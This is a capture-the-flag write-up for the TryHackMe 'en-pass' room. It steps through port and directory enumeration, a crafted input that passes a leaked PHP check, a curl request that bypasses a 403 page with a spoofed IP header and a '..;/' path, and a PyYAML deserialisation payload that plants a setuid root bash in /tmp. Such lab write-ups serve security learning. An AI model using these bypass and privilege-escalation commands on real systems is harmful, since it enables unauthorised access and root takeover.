# en-pass

https://tryhackme.com/room/enpass

## Port scanning
Let's see what's on our machine

`nmap -sC -sV 10.10.93.8 -oN scan`

![image](https://github.com/Roqlane/en-pass/assets/78229498/039e5932-a94d-4cc5-94df-9f046618a5a4)

As we can see, there is 2 port open and especially one that is a http port (8001). So let's explore this website.

## HTTP service on port 8001

![image](https://github.com/Roqlane/en-pass/assets/78229498/5467067e-ec9f-4bd5-89eb-1a1a28e87868)

When you look at the page or the source code, you can see several encoded messages but nothing interesting.
At this point, we can enumerate the website.

`gobuster dir -u "http://10.10.93.8:8001/" -w /usr/share/wordlists/dirb/common.txt -x .php, .txt`

![image](https://github.com/Roqlane/en-pass/assets/78229498/271c568a-81f3-4666-b3e0-43efe44a56fe)

We have 3 interesting results: reg.php, web and zip directories.
Let's start with exploring the reg.php.

## reg.php

![image](https://github.com/Roqlane/en-pass/assets/78229498/b7a44ed3-4b83-4f16-8eb2-09b42eda7746)

Looking at the source code, we see a leak of a php code. 
```
if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i', $title)){
      $val = explode(",",$title);
      $sum = 0;
      for($i = 0 ; $i < 9; $i++){
         if ((strlen($val[0]) == 2) and (strlen($val[8]) == 3)){
            if ($val[5] != $val[8] and $val[3] != $val[7]){
               $sum = $sum + (bool)$val[$i] . "<br>";
            }
         }
      }
      if ($sum == 9){
         echo $result;
         echo "Congo You Got It !! Nice";
      }else{
         echo "Try Try!!";
      }
   }else{
      echo "Try Again!!";
   }
}

```
So basically, this code want you to enter characters or strings separated by a comma, and to follow some rules in order to get the good result. After understanding it and trying a few things, I used this payload `!!,#,#,-,#,|,#,é,===` and...

![image](https://github.com/Roqlane/en-pass/assets/78229498/eab1cdbb-50af-431e-a3fd-c984352b9b20)

That is good, we got a password but we don't have any username. Remember the 2 other directories ? Let's check them.
I started by the zip one.

## Zip directory

![image](https://github.com/Roqlane/en-pass/assets/78229498/342d2f02-a96d-46c3-abe4-9c0978b50568)

Honestly, I was a little disapointed with this one. I used the wget command to download the whole directory and I wrote a script to list out the content of the zip files. All of them contain the word "sadman", so I thought that it was maybe a username for the ssh service. I try to connect with this username and the password we found but it didn't work.

## Web directory

Hmmmm

![image](https://github.com/Roqlane/en-pass/assets/78229498/6ab2896d-7998-4ab1-b25a-1cc0cc1dfd3a)

If we look at the first question of the chall, we can see that we have to find a path. In order to find it, I ran this command:
`dirb  http://10.10.160.24:8001/ /home/nk0/wordlists/common.txt`
And got this result:

![image](https://github.com/Roqlane/en-pass/assets/78229498/32246020-086e-4a08-8bc4-09c6b9de96ce)

So the PATH is: /web/resources/infoseek/configure/key

![image](https://github.com/Roqlane/en-pass/assets/78229498/3568c45f-84af-44c1-b1aa-7a4306ccec21)

Moving to this path we get a private key, but it isn't enough to get us in.

## 403.php

According to the hint we have to bypass the 403 forbidden error. In order to do that I used the tool 4-ZERO-3.
`./403-bypass.sh -u http://10.10.93.8:8001/403.php/ --header`

![image](https://github.com/Roqlane/en-pass/assets/78229498/37f4449a-4542-4b0b-a6d0-7f652abbf4cc)

Let's see what we got
`curl -ks -H 'X-Custom-IP-Authorization: 127.0.0.1' -X GET 'http://10.10.93.8:8001/403.php/..;/' -H 'User-Agent: Mozilla/5.0'`

![image](https://github.com/Roqlane/en-pass/assets/78229498/821b5157-7cbe-43f0-b15c-1173a5933d16)

Bingo !!
We now have our user and can log in to the ssh service.

![image](https://github.com/Roqlane/en-pass/assets/78229498/54c0f4f5-ba40-490c-b343-997551962080)

## Privesc

We have nothing interesting in the current directory, so all we have to do is to enumerate the machine. Finally, I spotted that there were things in the /opt directory and found a python file. 

![image](https://github.com/Roqlane/en-pass/assets/78229498/7508caf0-6abc-456a-99cd-4ffcd0332d31)

We can see in its content that it uses the PyYAML module and tries to read the /tmp/file.yml. After some search, I found this article https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-yaml-privilege-escalation/. Let's try it !

```echo '!!python/object/new:os.system ["cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u+sx /tmp/bash"]' > /tmp/file.yml```

And then

![image](https://github.com/Roqlane/en-pass/assets/78229498/7260b265-212d-4a73-ac2f-e9e6c6724440)

You may have to run the file.py two times in order to make the exploit work.

`ls /root`
![image](https://github.com/Roqlane/en-pass/assets/78229498/7bc893b0-beca-4495-978e-90deb8e0b241)



